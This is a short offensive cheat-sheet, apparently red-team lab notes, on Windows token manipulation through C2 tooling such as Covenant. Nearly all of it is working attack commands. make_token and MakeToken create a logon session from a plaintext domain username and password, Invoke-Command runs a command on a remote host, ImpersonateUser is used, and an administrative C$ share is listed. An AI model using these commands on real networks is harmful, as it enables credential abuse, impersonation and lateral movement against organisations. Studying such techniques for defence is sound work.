### Make Token
MakeToken Used Window API LOGON32_LOGON_NEW_CREDENTIALS.
This API creates a Logon Session from the specified credentials, copies existing Token, associates the new Logon Session with the new Access Token
```
make_token resilience\n.John F78rrari
MakeToken n.John resilience.local F78rrari #Covenant
PowerShell Invoke-Command -ComputerName n.John -ScriptBlock {ipconfig}
```
### Impersonate User
```
ImpersonateUser resilience\n.John
ls \\n.John\c$

```
